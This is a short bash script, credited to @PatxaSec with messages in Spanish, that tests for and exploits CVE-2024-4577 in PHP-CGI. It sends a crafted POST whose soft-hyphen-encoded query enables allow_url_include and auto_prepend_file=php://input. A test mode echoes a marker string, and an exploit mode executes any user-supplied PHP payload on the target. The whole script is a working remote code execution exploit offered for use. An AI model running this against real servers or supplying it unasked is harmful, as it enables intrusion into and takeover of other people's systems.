#!/bin/bash
# Creator: @PatxaSec


function cve_test() {
  url="$1"
  if [[ -z "$url" ]]; then
    echo "Error: URL no proporcionada"
    return 1
  fi

  output=$(curl -X POST -k -s "$url?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
    --header 'User-Agent: curl/8.3.0' \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --header 'Connection: keep-alive' \
    --header 'Accept: */*' \
    --data '<?php echo "CVE_2024_4577_TEST"; ?>')
  echo "========================================================================================"
  if grep -q "CVE_2024_4577_TEST" <<< "$output"; then
    echo "[+] La URL $url es vulnerable a CVE-2024-4577 (allow_url_include y auto_prepend_file)"
  else
    echo "[!] La URL $url no es vulnerable a CVE-2024-4577"
  fi
  echo "========================================================================================"
}

function cve_exploit() {
  url="$1"
  payload="$2"
  if [[ -z "$url" || -z "$payload" ]]; then
    echo "Error: URL o payload no proporcionados"
    return 1
  fi

  output=$(curl -X POST -k -s "$url?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
    --header 'User-Agent: curl/8.3.0' \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --header 'Connection: keep-alive' \
    --header 'Accept: */*' \
    --data "$payload")
}

main() {
  if [ "$#" -eq 1 ]; then
    cve_test "$1"
  elif [ "$#" -eq 2 ]; then
    cve_exploit "$1" "$2"
  else
    echo "Uso incorrecto: $0 <URL> [URL-Encoded php payload]"
    exit 1
  fi
}

main "$@"